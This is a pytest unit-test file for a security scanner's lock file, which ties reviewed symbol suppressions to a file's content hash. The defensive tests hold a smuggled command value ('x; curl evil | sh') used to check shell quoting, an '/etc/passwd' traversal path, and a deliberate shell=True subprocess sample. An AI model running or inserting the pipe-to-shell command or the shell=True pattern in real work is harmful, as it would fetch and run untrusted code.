# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: Apache-2.0

"""``.ash.lock`` binds a symbol suppression to its file's content hash.

Why this exists
---------------
A symbol suppression follows its definition wherever edits move it, so a
rewritten definition kept the old review. The lock records the hash of the
file's bytes when the suppression was reviewed:

- a symbol suppression whose file has no lock entry is refused where the config
  is validated, and the message names the command that creates the entry;
- when the file's hash no longer matches, the suppression does not apply (its
  finding returns) and one notice names the file, the suppressions and the
  refresh command; ``ash suppress refresh`` cures it;
- a line-pinned suppression is not touched by any of it;
- the same tree always produces the same lock bytes.

The inert-on-mismatch tests parse real source with tree-sitter, which is the
optional ``symbols`` extra: without it they skip, unless
``ASH_REQUIRE_SYMBOLS_EXTRA`` is set, as CI sets it.
"""

from __future__ import annotations

import logging
import os
import sys
from pathlib import Path

import pytest

from automated_security_helper.base.plugin_context import PluginContext
from automated_security_helper.config.ash_config import AshConfig
from automated_security_helper.core.exceptions import ASHConfigValidationError
from automated_security_helper.core.orchestrator import resolve_scan_config
from automated_security_helper.models.core import AshSuppression
from automated_security_helper.schemas.sarif_schema_model import (
    ArtifactLocation,
    Location,
    Message,
    PhysicalLocation2,
    Region,
    Result,
    Run,
    SarifReport,
    Tool,
    ToolComponent,
)
from automated_security_helper.utils import symbol_spans
from automated_security_helper.utils import ash_lock as ash_lock_module
from automated_security_helper.utils.ash_lock import (
    LEGACY_LOCK_RELATIVE_PATH,
    LOCK_RELATIVE_PATH,
    AshLock,
    AshLockError,
    LockScope,
    lock_key,
    refuse_unlocked_symbol_suppressions,
)
from automated_security_helper.utils.sarif_utils import apply_suppressions_to_sarif

pytestmark = pytest.mark.unit

SOURCE = """\
import subprocess


def risky():
    subprocess.call("ls", shell=True)  # MARK risky


def other():
    subprocess.call("ls", shell=True)  # MARK other
"""


def _need_symbols_extra() -> None:
    try:
        import tree_sitter  # noqa: F401
        import tree_sitter_python  # noqa: F401
    except ImportError as exc:  # pragma: no cover - environment-dependent
        if os.environ.get("ASH_REQUIRE_SYMBOLS_EXTRA", "").strip().upper() in (
            "1",
            "YES",
            "TRUE",
        ):
            pytest.fail(
                f"ASH_REQUIRE_SYMBOLS_EXTRA is set but the extra is missing: {exc}"
            )
        pytest.skip(f"[symbols] extra not installed ({exc})")


@pytest.fixture(autouse=True)
def _fresh_cache():
    symbol_spans.clear_symbol_cache()
    yield
    symbol_spans.clear_symbol_cache()


def _line(marker: str) -> int:
    hits = [i for i, t in enumerate(SOURCE.splitlines(), 1) if marker in t]
    assert len(hits) == 1
    return hits[0]


def _tree(tmp_path: Path, source: str = SOURCE) -> Path:
    root = tmp_path / "repo"
    (root / "src").mkdir(parents=True)
    (root / "src" / "app.py").write_text(source, encoding="utf-8")
    return root


def _symbol_suppression(symbol: str = "risky", path: str = "src/app.py"):
    return AshSuppression(rule_id="B602", path=path, symbol=symbol, reason="reviewed")


def _sarif(uri: str, lines) -> SarifReport:
    return SarifReport(
        version="2.1.0",
        runs=[
            Run(
                tool=Tool(driver=ToolComponent(name="bandit", version="1")),
                results=[
                    Result(
                        ruleId="B602",
                        message=Message(text="subprocess with shell=True"),
                        locations=[
                            Location(
                                physicalLocation=PhysicalLocation2(
                                    artifactLocation=ArtifactLocation(uri=uri),
                                    region=Region(startLine=n, endLine=n),
                                )
                            )
                        ],
                    )
                    for n in lines
                ],
            )
        ],
    )


def _context(root: Path, tmp_path: Path, suppressions) -> PluginContext:
    """One scan's context: every suppression pass of that scan shares it."""
    config = AshConfig(
        project_name="p", global_settings={"suppressions": list(suppressions)}
    )
    return PluginContext(source_dir=root, output_dir=tmp_path / "out", config=config)


def _apply(root: Path, tmp_path: Path, suppressions, lines, context=None):
    if context is None:
        context = _context(root, tmp_path, suppressions)
    report = apply_suppressions_to_sarif(_sarif("src/app.py", lines), context)
    return [bool(r.suppressions) for r in report.runs[0].results]


def _lock(root: Path, *scopes: LockScope) -> AshLock:
    lock = AshLock(source_dir=root)
    for scope in scopes:
        lock.bind("src/app.py", scope, now="2026-01-01T00:00:00Z")
    lock.save()
    return lock


def _config_text(root: Path, suppressions: str) -> Path:
    path = root / ".ash.yaml"
    path.write_text(
        "project_name: t\nfail_on_findings: false\nglobal_settings:\n"
        f"  suppressions:\n{suppressions}",
        encoding="utf-8",
    )
    return path


SYMBOL_ENTRY = (
    "    - rule_id: B602\n"
    "      path: src/app.py\n"
    "      symbol: risky\n"
    "      reason: reviewed\n"
)
LINE_ENTRY = (
    "    - rule_id: B602\n"
    "      path: src/app.py\n"
    "      line_start: 5\n"
    "      line_end: 5\n"
    "      reason: reviewed\n"
)


class TestRefusalWithoutALockEntry:
    def test_refuse_names_the_command_and_the_file(self, tmp_path):
        root = _tree(tmp_path)
        with pytest.raises(ASHConfigValidationError) as caught:
            refuse_unlocked_symbol_suppressions([_symbol_suppression()], root)
        text = str(caught.value)
        assert "ash suppress add B602 --symbol risky --file src/app.py" in text
        assert LOCK_RELATIVE_PATH in text

    def test_a_lock_entry_for_the_file_admits_it(self, tmp_path):
        root = _tree(tmp_path)
        _lock(root, LockScope("B602", "risky"))
        refuse_unlocked_symbol_suppressions([_symbol_suppression()], root)

    def test_an_entry_for_another_file_does_not(self, tmp_path):
        root = _tree(tmp_path)
        (root / "src" / "b.py").write_text("x = 1\n", encoding="utf-8")
        lock = AshLock(source_dir=root)
        lock.bind("src/b.py", LockScope("B602", "risky"))
        lock.save()
        with pytest.raises(ASHConfigValidationError):
            refuse_unlocked_symbol_suppressions([_symbol_suppression()], root)

    def test_a_scan_resolving_its_config_refuses_it(self, tmp_path, monkeypatch):
        monkeypatch.delenv("ASH_CONFIG", raising=False)
        root = _tree(tmp_path)
        config = _config_text(root, SYMBOL_ENTRY)
        with pytest.raises(ASHConfigValidationError, match="ash suppress add"):
            resolve_scan_config(config_path=config, source_dir=root)
        _lock(root, LockScope("B602", "risky"))
        resolved = resolve_scan_config(config_path=config, source_dir=root)
        assert resolved.global_settings.suppressions[0].symbol == "risky"

    def test_config_validate_reports_it_as_an_error(self, tmp_path, monkeypatch):
        from automated_security_helper.config.config_validator import ConfigValidator

        monkeypatch.delenv("ASH_CONFIG", raising=False)
        root = _tree(tmp_path)
        config = _config_text(root, SYMBOL_ENTRY)
        check = ConfigValidator.check_config_file(config, source_dir=root)
        assert not check.scan_accepts
        assert any("ash suppress add" in e for e in check.errors), check.errors
        _lock(root, LockScope("B602", "risky"))
        assert ConfigValidator.check_config_file(config, source_dir=root).scan_accepts

    def test_config_validate_without_a_source_dir_warns_and_does_not_refuse(
        self, tmp_path, monkeypatch
    ):
        # MCP validate_config and validate_and_raise call check_config_file
        # with no source_dir, so the directory a scan reads is unknown and the
        # lock beside the config is only a guess at its lock: MCP content is
        # written to an empty temporary directory, and a config outside the
        # scanned tree sits beside none of that tree. As an error, every
        # symbol suppression there made the config invalid where a scan of
        # its tree accepts it. The check still runs (out of ``.ash/`` too) and
        # what it finds is a warning naming the command.
        from automated_security_helper.config.config_validator import ConfigValidator

        monkeypatch.delenv("ASH_CONFIG", raising=False)
        root = _tree(tmp_path)
        config = _config_text(root, SYMBOL_ENTRY)
        check = ConfigValidator.check_config_file(config)
        assert check.scan_accepts, check.errors
        noted = [
            w
            for w in check.warnings
            if w.startswith(ConfigValidator.LOCK_NOT_CHECKED_PREFIX)
        ]
        assert len(noted) == 1, check.warnings
        assert "ash suppress add B602 --symbol risky --file src/app.py" in noted[0]
        _lock(root, LockScope("B602", "risky"))
        after = ConfigValidator.check_config_file(config)
        assert after.scan_accepts, after.errors
        assert not any(
            w.startswith(ConfigValidator.LOCK_NOT_CHECKED_PREFIX)
            for w in after.warnings
        ), after.warnings

    def test_mcp_validate_config_content_is_not_refused_for_a_lock_it_cannot_see(
        self, tmp_path, monkeypatch
    ):
        # The content is written to an empty temporary directory, so no lock
        # is ever beside it: the scanned tree's lock below records the
        # suppression, and the answer was still ``valid: False``.
        from automated_security_helper.cli.mcp_tools import mcp_validate_config
        from automated_security_helper.config.config_validator import ConfigValidator

        monkeypatch.delenv("ASH_CONFIG", raising=False)
        root = _tree(tmp_path)
        config = _config_text(root, SYMBOL_ENTRY)
        _lock(root, LockScope("B602", "risky"))
        result = mcp_validate_config(config_content=config.read_text(encoding="utf-8"))
        assert result["valid"] is True, result
        assert result["errors"] == [], result
        assert any(
            w["message"].startswith(ConfigValidator.LOCK_NOT_CHECKED_PREFIX)
            for w in result["warnings"]
        ), result["warnings"]

    def test_an_unrecorded_scope_on_a_locked_file_is_refused(self, tmp_path):
        # The entry alone is not enough: once src/app.py was locked for
        # B602/risky, a suppression hand-added to the same file (another rule,
        # a broader symbol) was never reviewed, and without this it applied
        # silently and refresh re-approved it unseen.
        root = _tree(tmp_path)
        _lock(root, LockScope("B602", "risky"))
        refuse_unlocked_symbol_suppressions([_symbol_suppression()], root)
        # Rule ids match case-insensitively everywhere, the scope lookup too.
        refuse_unlocked_symbol_suppressions(
            [
                AshSuppression(
                    rule_id="b602", path="src/app.py", symbol="risky", reason="r"
                )
            ],
            root,
        )
        for rule_id, symbol in (("B605", "risky"), ("B602", "other")):
            with pytest.raises(ASHConfigValidationError, match="ash suppress add"):
                refuse_unlocked_symbol_suppressions(
                    [
                        AshSuppression(
                            rule_id=rule_id,
                            path="src/app.py",
                            symbol=symbol,
                            reason="r",
                        )
                    ],
                    root,
                )

    def test_the_orchestrator_refuses_a_caller_resolved_config_too(self, tmp_path):
        # A workspace project hands the orchestrator a resolved config, which
        # skips resolve_scan_config and so skipped the refusal: a workspace-mode
        # scan ran an unrecorded symbol suppression where `ash scan` refused it.
        from automated_security_helper.core.orchestrator import ASHScanOrchestrator

        root = _tree(tmp_path)
        config = AshConfig(project_name="t", fail_on_findings=False)
        config.global_settings.suppressions = [_symbol_suppression()]
        orchestrator = ASHScanOrchestrator(
            source_dir=root, output_dir=tmp_path / "out", resolved_config=config
        )
        with pytest.raises(ASHConfigValidationError, match="ash suppress add"):
            orchestrator._initialize()
        _lock(root, LockScope("B602", "risky"))
        orchestrator._initialize()

    def test_the_suggested_command_quotes_what_the_config_controls(self):
        import shlex

        from automated_security_helper.utils.ash_lock import add_command_for

        command = add_command_for("B602", "Handler.run", "x; curl evil | sh")
        parts = shlex.split(command)
        assert "x; curl evil | sh" in parts
        assert parts[:3] == ["ash", "suppress", "add"]
        plain = add_command_for("B602", "risky", "src/app.py")
        assert "ash suppress add B602 --symbol risky --file src/app.py" in plain

    def test_the_suggested_command_writes_a_rule_id_that_is_not_a_string(self):
        # An unquoted `rule_id: 602` reads from YAML as an int, and
        # shlex.quote raised TypeError on it.
        from automated_security_helper.utils.ash_lock import add_command_for

        assert add_command_for(602, "risky", "src/app.py").startswith(
            "ash suppress add 602 --symbol risky --file src/app.py "
        )
        assert add_command_for(None, "risky", "src/app.py").startswith(
            "ash suppress add '<rule-id>' --symbol risky"
        )

    @pytest.mark.skipif(
        sys.platform == "win32",
        reason="symlink creation needs privileges on Windows",
    )
    def test_a_path_through_a_link_is_looked_up_under_the_file_it_leads_to(
        self, tmp_path
    ):
        # `add` keys a suppression by the file its path leads to, as a scan
        # looks it up; the config check keyed it as written, so link/app.py
        # stayed refused after its own advised `add` had locked src/app.py.
        from automated_security_helper.utils.ash_lock import resolved_lock_key

        root = _tree(tmp_path)
        (root / "link").symlink_to(root / "src", target_is_directory=True)
        _lock(root, LockScope("B602", "risky"))
        refuse_unlocked_symbol_suppressions(
            [_symbol_suppression(path="link/app.py")], root
        )
        assert resolved_lock_key(root, "link/app.py") == "src/app.py"
        assert resolved_lock_key(root, "./src\\app.py") == "src/app.py"
        assert resolved_lock_key(root, "../outside.py") is None
        (root / "out").symlink_to(tmp_path, target_is_directory=True)
        assert resolved_lock_key(root, "out/x.py") is None

    def test_a_suppression_whose_file_is_gone_is_told_to_go_not_to_be_added(
        self, tmp_path
    ):
        # `refresh --drop-missing` leaves the entry gone and the suppression
        # unrecorded; the `add` command the refusal named then failed with
        # "is not a file", so the advice could never be followed.
        root = _tree(tmp_path)
        (root / "src" / "app.py").unlink()
        with pytest.raises(ASHConfigValidationError) as caught:
            refuse_unlocked_symbol_suppressions([_symbol_suppression()], root)
        text = str(caught.value)
        assert "'src/app.py' no longer exists" in text, text
        assert "remove it from the config" in text
        assert "ash suppress add" not in text
        # A root that is only a guess at the scanned tree calls nothing gone.
        with pytest.raises(ASHConfigValidationError) as guessed:
            refuse_unlocked_symbol_suppressions(
                [_symbol_suppression()], root, scanned_tree=False
            )
        assert "ash suppress add B602 --symbol risky --file src/app.py" in str(
            guessed.value
        )

    @pytest.mark.skipif(
        sys.platform == "win32",
        reason="symlink creation needs privileges on Windows",
    )
    def test_only_a_file_that_no_longer_exists_is_gone(self, tmp_path):
        from automated_security_helper.utils.ash_lock import file_is_gone

        root = _tree(tmp_path)
        assert not file_is_gone(root, "src/app.py")
        assert file_is_gone(root, "src/missing.py")
        # A pattern or a directory spelling names no one file to be gone.
        assert not file_is_gone(root, "src/*.py")
        assert not file_is_gone(root, "src/missing/")
        assert not file_is_gone(root, "../missing.py")
        # The link itself exists, so it is not gone; it cannot be hashed.
        (root / "src" / "dangling.py").symlink_to(root / "nowhere.py")
        assert not file_is_gone(root, "src/dangling.py")

    def test_a_locked_file_that_exists_but_cannot_be_hashed_is_not_advised_the_drop(
        self, tmp_path
    ):
        # `refresh --drop-missing` keeps the entry of a file that is still
        # there, so a notice advising it would send the operator in a circle.
        from automated_security_helper.utils.ash_lock import stale_notice

        root = _tree(tmp_path)
        entry = _lock(root, LockScope("B602", "risky")).entries["src/app.py"]
        kept = stale_notice("src/app.py", entry, "missing", gone=False)
        assert "--drop-missing" not in kept
        assert "exists but cannot be hashed" in kept
        assert "ash suppress refresh src/app.py" in kept
        gone = stale_notice("src/app.py", entry, "missing", gone=True)
        assert "ash suppress refresh --drop-missing src/app.py" in gone

    def test_a_missing_entry_is_advised_the_drop_and_a_stale_one_the_refresh(
        self, tmp_path
    ):
        from automated_security_helper.utils.ash_lock import stale_notice

        root = _tree(tmp_path)
        lock = _lock(root, LockScope("B602", "risky"))
        entry = lock.entries["src/app.py"]
        missing = stale_notice("src/app.py", entry, "missing")
        assert "ash suppress refresh --drop-missing src/app.py" in missing
        assert "reported again" not in missing
        stale = stale_notice("src/app.py", entry, "stale")
        assert "ash suppress refresh src/app.py" in stale
        assert "--drop-missing" not in stale

    def test_a_damaged_lock_is_refused_not_read_as_empty(self, tmp_path):
        root = _tree(tmp_path)
        lock_path = root / LOCK_RELATIVE_PATH
        lock_path.parent.mkdir(parents=True, exist_ok=True)
        lock_path.write_text("{not json", encoding="utf-8")
        with pytest.raises(AshLockError):
            AshLock.load(root)
        with pytest.raises(ASHConfigValidationError, match="not valid JSON"):
            refuse_unlocked_symbol_suppressions([_symbol_suppression()], root)


class TestLinePinsAreUnaffected:
    def test_a_line_pin_needs_no_lock_entry(self, tmp_path, monkeypatch):
        monkeypatch.delenv("ASH_CONFIG", raising=False)
        root = _tree(tmp_path)
        config = _config_text(root, LINE_ENTRY)
        refuse_unlocked_symbol_suppressions(
            [
                AshSuppression(
                    rule_id="B602",
                    path="src/app.py",
                    line_start=5,
                    line_end=5,
                    reason="r",
                )
            ],
            root,
        )
        resolved = resolve_scan_config(config_path=config, source_dir=root)
        assert resolved.global_settings.suppressions[0].line_start == 5
        assert not (root / LOCK_RELATIVE_PATH).exists()

    def test_a_line_pin_still_suppresses_after_the_file_changes(self, tmp_path):
        root = _tree(tmp_path)
        pin = AshSuppression(
            rule_id="B602", path="src/app.py", line_start=5, line_end=5, reason="r"
        )
        before = _apply(root, tmp_path, [pin], [5])
        (root / "src" / "app.py").write_text(SOURCE + "# edited\n", encoding="utf-8")
        assert before == [True]
        assert _apply(root, tmp_path, [pin], [5]) == [True]


class TestInertOnMismatch:
    def test_unchanged_file_suppresses_only_inside_the_symbol(self, tmp_path):
        _need_symbols_extra()
        root = _tree(tmp_path)
        _lock(root, LockScope("B602", "risky"))
        assert _apply(
            root,
            tmp_path,
            [_symbol_suppression()],
            [_line("MARK risky"), _line("MARK other")],
        ) == [True, False]

    def test_an_edit_returns_the_finding_with_one_notice_and_refresh_cures(
        self, tmp_path, caplog
    ):
        _need_symbols_extra()
        root = _tree(tmp_path)
        _lock(root, LockScope("B602", "risky"))
        app = root / "src" / "app.py"
        app.write_text(SOURCE.replace("ls", "ls -l"), encoding="utf-8")
        lines = [_line("MARK risky"), _line("MARK risky")]
        with caplog.at_level(logging.WARNING, logger="ash"):
            # Two findings in the one file, so the notice is once per file.
            applied = _apply(root, tmp_path, [_symbol_suppression()], lines)
        assert applied == [False, False]
        notices = [
            r.getMessage()
            for r in caplog.records
            if "Stale suppression" in r.getMessage()
        ]
        assert len(notices) == 1, notices
        assert "src/app.py" in notices[0]
        assert "B602 in risky" in notices[0]
        assert "ash suppress refresh src/app.py" in notices[0]

        lock = AshLock.load(root)
        old, new = lock.refresh("src/app.py")
        lock.save()
        assert old != new
        symbol_spans.clear_symbol_cache()
        assert _apply(root, tmp_path, [_symbol_suppression()], lines[:1]) == [True]

    def test_each_scan_names_a_stale_file_once_though_the_process_goes_on(
        self, tmp_path, caplog
    ):
        # The record of notices already printed was the process's, so in a
        # long-lived process (the MCP server, the express daemon) every scan
        # after the first dropped the suppression and said nothing. It is the
        # scan's: two passes over one scan's context name the file once, and
        # the next scan, a new context, names it again. No cache is cleared
        # between them.
        _need_symbols_extra()
        root = _tree(tmp_path)
        _lock(root, LockScope("B602", "risky"))
        (root / "src" / "app.py").write_text(
            SOURCE.replace("ls", "ls -l"), encoding="utf-8"
        )
        lines = [_line("MARK risky")]
        suppressions = [_symbol_suppression()]
        scan = _context(root, tmp_path, suppressions)

        def notices():
            return [
                r.getMessage()
                for r in caplog.records
                if "Stale suppression" in r.getMessage()
            ]

        with caplog.at_level(logging.WARNING, logger="ash"):
            assert _apply(root, tmp_path, suppressions, lines, scan) == [False]
            assert _apply(root, tmp_path, suppressions, lines, scan) == [False]
            first_scan = notices()
            assert _apply(root, tmp_path, suppressions, lines) == [False]
        assert len(first_scan) == 1, first_scan
        assert len(notices()) == 2, notices()

    def test_each_scan_names_a_broken_lock_once(self, tmp_path, caplog):
        root = _tree(tmp_path)
        (root / LOCK_RELATIVE_PATH).write_text("{not json", encoding="utf-8")
        lines = [_line("MARK risky")]
        suppressions = [_symbol_suppression()]
        scan = _context(root, tmp_path, suppressions)
        with caplog.at_level(logging.WARNING, logger="ash"):
            assert _apply(root, tmp_path, suppressions, lines, scan) == [False]
            assert _apply(root, tmp_path, suppressions, lines, scan) == [False]
            assert _apply(root, tmp_path, suppressions, lines) == [False]
        broken = [
            r.getMessage()
            for r in caplog.records
            if r.getMessage().startswith("Symbol suppressions do not apply")
        ]
        assert len(broken) == 2, broken

    def test_a_locked_file_that_was_deleted_stays_inert(self, tmp_path):
        _need_symbols_extra()
        root = _tree(tmp_path)
        _lock(root, LockScope("B602", "risky"))
        (root / "src" / "app.py").unlink()
        assert AshLock.load(root).status("src/app.py") == "missing"

    def test_a_suppression_with_no_entry_is_inert_at_scan_time(self, tmp_path, caplog):
        _need_symbols_extra()
        root = _tree(tmp_path)
        with caplog.at_level(logging.WARNING, logger="ash"):
            applied = _apply(
                root, tmp_path, [_symbol_suppression()], [_line("MARK risky")]
            )
        assert applied == [False]
        assert any("no entry" in r.getMessage() for r in caplog.records)


class TestLockFile:
    def test_the_same_tree_gives_byte_identical_locks(self, tmp_path):
        first = _tree(tmp_path / "a")
        second = _tree(tmp_path / "b")
        # Scopes bound in a different order, same stamp: the bytes are equal.
        _lock(first, LockScope("B602", "risky"), LockScope("B602", "other"))
        _lock(second, LockScope("B602", "other"), LockScope("B602", "risky"))
        assert (first / LOCK_RELATIVE_PATH).read_bytes() == (
            second / LOCK_RELATIVE_PATH
        ).read_bytes()

    def test_the_bytes_are_sorted_and_end_in_one_newline(self, tmp_path):
        root = _tree(tmp_path)
        (root / "src" / "a.py").write_text("x = 1\n", encoding="utf-8")
        lock = AshLock(source_dir=root)
        lock.bind("src/app.py", LockScope("B602", "risky"), now="2026-01-01T00:00:00Z")
        lock.bind("src/a.py", LockScope("B101", "f"), now="2026-01-01T00:00:00Z")
        text = lock.to_text()
        assert text.endswith("}\n") and not text.endswith("\n\n")
        assert text.index('"src/a.py"') < text.index('"src/app.py"')
        assert text.index('"created"') < text.index('"scopes"') < text.index('"sha256"')

    def test_a_reloaded_lock_writes_the_same_bytes(self, tmp_path):
        root = _tree(tmp_path)
        _lock(root, LockScope("B602", "risky"))
        before = (root / LOCK_RELATIVE_PATH).read_bytes()
        AshLock.load(root).save()
        assert (root / LOCK_RELATIVE_PATH).read_bytes() == before

    @pytest.mark.parametrize(
        "path", ["", "/etc/passwd", "../x.py", "a/../../x.py", "."]
    )
    def test_a_path_outside_the_root_is_no_key(self, path):
        assert lock_key(path) is None

    def test_a_key_is_posix_without_a_leading_dot_slash(self):
        assert lock_key("./src\\app.py") == "src/app.py"

    def test_binding_a_changed_file_is_refused_until_it_is_refreshed(self, tmp_path):
        root = _tree(tmp_path)
        lock = _lock(root, LockScope("B602", "risky"))
        (root / "src" / "app.py").write_text(SOURCE + "# edit\n", encoding="utf-8")
        with pytest.raises(AshLockError, match="ash suppress refresh"):
            lock.bind("src/app.py", LockScope("B602", "other"))

    def test_binding_a_rule_id_that_differs_only_in_case_adds_no_scope(self, tmp_path):
        # Rule ids match case-insensitively everywhere (scope_is_recorded);
        # compared exactly, `add b602` after `add B602` bound a second scope
        # and rewrote the lock while the config check called it the same one.
        root = _tree(tmp_path)
        lock = _lock(root, LockScope("B602", "risky"))
        before = lock.to_text()
        lock.bind("src/app.py", LockScope("b602", "risky"))
        assert lock.entries["src/app.py"].scopes == [LockScope("B602", "risky")]
        assert lock.to_text() == before


def _legacy_lock(root: Path) -> bytes:
    """A lock written where v3.8-era commands wrote it, .ash/ash.lock."""
    lock = _lock(root, LockScope("B602", "risky"))
    text = lock.to_text().encode("utf-8")
    (root / LOCK_RELATIVE_PATH).unlink()
    legacy = root / LEGACY_LOCK_RELATIVE_PATH
    legacy.parent.mkdir(parents=True, exist_ok=True)
    legacy.write_bytes(text)
    return text


class TestTheLockIsTheRootDotfile:
    def test_the_lock_is_written_at_the_root_and_not_under_dot_ash(self, tmp_path):
        root = _tree(tmp_path)
        _lock(root, LockScope("B602", "risky"))
        assert LOCK_RELATIVE_PATH == ".ash.lock"
        assert (root / ".ash.lock").is_file()
        assert not (root / ".ash" / "ash.lock").exists()

    def test_a_legacy_lock_is_still_read_with_a_deprecation_warning(
        self, tmp_path, caplog, monkeypatch
    ):
        monkeypatch.setattr(ash_lock_module, "_LEGACY_WARNED", set())
        root = _tree(tmp_path)
        _legacy_lock(root)
        with caplog.at_level(logging.WARNING, logger="ash"):
            lock = AshLock.load(root)
            AshLock.load(root)
        assert lock.from_legacy and "src/app.py" in lock.entries
        refuse_unlocked_symbol_suppressions([_symbol_suppression()], root)
        notices = [
            r.getMessage() for r in caplog.records if "deprecated" in r.getMessage()
        ]
        assert len(notices) == 1, notices
        assert ".ash/ash.lock" in notices[0] and "v4.0" in notices[0]
        assert "git mv .ash/ash.lock .ash.lock" in notices[0]
        # The move alone: advising `ash suppress refresh` here re-approved
        # every unreviewed change in a stale legacy lock in one step.
        assert "refresh" not in notices[0]

    def test_saving_a_legacy_lock_writes_the_root_file_and_leaves_the_old_one(
        self, tmp_path
    ):
        root = _tree(tmp_path)
        text = _legacy_lock(root)
        lock = AshLock.load(root)
        lock.save()
        assert (root / ".ash.lock").read_bytes() == text
        assert (root / ".ash" / "ash.lock").read_bytes() == text

    def test_the_root_lock_wins_and_the_legacy_one_is_not_even_warned_about(
        self, tmp_path, caplog, monkeypatch
    ):
        monkeypatch.setattr(ash_lock_module, "_LEGACY_WARNED", set())
        root = _tree(tmp_path)
        _legacy_lock(root)
        (root / "src" / "b.py").write_text("x = 1\n", encoding="utf-8")
        current = AshLock(source_dir=root)
        current.bind("src/b.py", LockScope("B101", "f"))
        current.save()
        with caplog.at_level(logging.WARNING, logger="ash"):
            lock = AshLock.load(root)
        assert set(lock.entries) == {"src/b.py"} and not lock.from_legacy
        assert not [r for r in caplog.records if "deprecated" in r.getMessage()]
